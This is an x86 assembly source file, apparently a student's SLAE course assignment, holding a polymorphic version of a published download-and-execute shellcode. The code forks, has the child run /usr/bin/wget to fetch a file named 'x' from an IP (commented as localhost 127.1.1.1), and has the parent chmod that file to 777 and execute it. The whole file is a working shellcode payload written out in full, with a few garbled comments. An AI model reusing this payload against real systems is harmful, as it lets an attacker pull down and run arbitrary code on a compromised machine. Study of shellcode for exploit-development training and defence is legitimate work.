; SLAE-xxx
; thanks to students previous writeups 
; assignment 6.3 : polymorphic version of shellstorm shellcode 
; originality : polymorphic version of downloachmod 

; original shellcode 
; Filename: downloadexec.nasm
; Author: Daniel Sauder

global _start

section .text

_start:

    ;fork
    xor eax,eax
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    mov al,0x7
    int 0x80
        
    ;chmod x
    xor ecx,ecx
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    xor ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80
    
child:
    ;download ip/x with wget
    push 0xb
    pop eax
    cdq
    push edx
    
    ;push 0x782f2f31 ; we changed the IP for localhost 127.1.1.1 no null byte 
    push 0x782f2f31 ;22.2 ; x//1
    push 0x2e312e31 ;.861 ; .1.1
    push 0x2e373231 ;.721
    mov ecx,esp
    push edx
    
    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80
    
